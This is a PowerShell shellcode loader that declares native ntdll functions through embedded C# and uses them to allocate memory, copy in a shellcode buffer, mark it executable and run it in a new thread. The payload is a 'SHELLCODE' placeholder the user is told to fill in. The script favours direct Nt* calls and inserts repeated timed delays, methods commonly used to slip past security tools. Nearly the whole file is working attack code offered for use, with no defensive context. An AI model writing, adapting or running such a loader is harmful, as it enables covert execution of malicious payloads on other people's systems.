Add-Type @"
    using System;
    using System.Runtime.InteropServices;

    public class NtDll {
        [DllImport("ntdll.dll", SetLastError = true)]
        public static extern int NtAllocateVirtualMemory(IntPtr ProcessHandle, ref IntPtr BaseAddress, IntPtr ZeroBits, ref IntPtr RegionSize, uint AllocationType, uint Protect);

        [DllImport("ntdll.dll", SetLastError = true)]
        public static extern int NtFreeVirtualMemory(IntPtr ProcessHandle, ref IntPtr BaseAddress, ref IntPtr RegionSize, uint FreeType);

        [DllImport("ntdll.dll", SetLastError = true)]
        public static extern int NtCreateThreadEx(out IntPtr ThreadHandle, uint DesiredAccess, IntPtr ObjectAttributes, IntPtr ProcessHandle, IntPtr StartAddress, IntPtr Argument, uint CreateFlags, uint ZeroBits, uint StackSize, uint MaximumStackSize, IntPtr AttributeList);

        [DllImport("ntdll.dll", SetLastError = true)]
        public static extern int NtWaitForSingleObject(IntPtr Handle, bool Alertable, IntPtr Timeout);

        [DllImport("ntdll.dll", SetLastError = true)]
        public static extern int NtProtectVirtualMemory(IntPtr ProcessHandle, ref IntPtr BaseAddress, ref IntPtr RegionSize, uint NewProtect, out uint OldProtect);

        [DllImport("ntdll.dll", SetLastError = true)]
        public static extern int NtDelayExecution(bool Alertable, ref long DelayInterval);

        [DllImport("ntdll.dll", SetLastError = true)]
        public static extern int ZwSetTimerResolution(uint RequestedResolution, bool Set, ref uint ActualResolution);
    }

    public class MyFunctions {
        private static bool once = true;

        public static void SleepShort(float milliseconds) {
            if (once) {
                uint actualResolution = 0;
                NtDll.ZwSetTimerResolution(1, true, ref actualResolution);
                once = false;
            }

            long interval = (long)(-1 * milliseconds * 10000.0f);
            NtDll.NtDelayExecution(false, ref interval);
        }
    }
"@

# Add-Type block remains unchanged

# Define shellcode bytes (replace SHELLCODE with your actual shellcode)
[Byte[]] $buf = SHELLCODE

# Calculate the size of the shellcode
$size = $buf.Length

# Sleep function for delay
function SleepShort($milliseconds) {
    [MyFunctions]::SleepShort($milliseconds)
}

# Ensure enough delay between operations
SleepShort 2000;

# Allocate read-write memory using NtAllocateVirtualMemory
$addr = [IntPtr]::Zero
[NtDll]::NtAllocateVirtualMemory(-1, [ref]$addr, [IntPtr]::Zero, [ref]$size, 0x3000, 0x4)  # AllocationType = MEM_COMMIT, Protect = PAGE_READWRITE

SleepShort 2000;

# Copy the shellcode to the allocated memory
[Runtime.InteropServices.Marshal]::Copy($buf, 0, $addr, $buf.Length)

SleepShort 2000;

# Change the memory protection to read-execute using NtProtectVirtualMemory
$oldProtect = 0
[NtDll]::NtProtectVirtualMemory(-1, [ref]$addr, [ref]$size, 0x20, [ref]$oldProtect)  # NewProtect = PAGE_EXECUTE_READ

SleepShort 2000;

# Create a new thread and execute the shellcode using NtCreateThreadEx
$thandle = [IntPtr]::Zero
[NtDll]::NtCreateThreadEx([ref]$thandle, 0x1FFFFF, [IntPtr]::Zero, -1, $addr, [IntPtr]::Zero, 0, 0, 0, 0, [IntPtr]::Zero)

# Wait for the thread to finish using NtWaitForSingleObject
[NtDll]::NtWaitForSingleObject($thandle, $false, [IntPtr]::Zero)

SleepShort 2000;

# Free the allocated memory using NtFreeVirtualMemory
[NtDll]::NtFreeVirtualMemory(-1, [ref]$addr, [ref]$size, 0x8000)  # FreeType = MEM_RELEASE
